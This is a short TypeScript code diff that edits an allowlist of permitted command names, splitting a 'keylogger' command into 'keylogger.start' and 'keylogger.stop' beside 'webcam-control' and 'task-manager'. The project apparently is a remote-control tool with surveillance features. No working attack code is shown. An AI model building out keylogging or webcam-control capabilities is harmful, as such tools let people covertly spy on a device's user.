@@ -19,7 +19,8 @@ const allowedCommandNames: readonly CommandName[] = [
   'tool-activation',
   'webcam-control',
   'task-manager',
-  'keylogger'
+  'keylogger.start',
+  'keylogger.stop'
 ];
 
 const allowedCommandNameSet = new Set<CommandName>(allowedCommandNames);
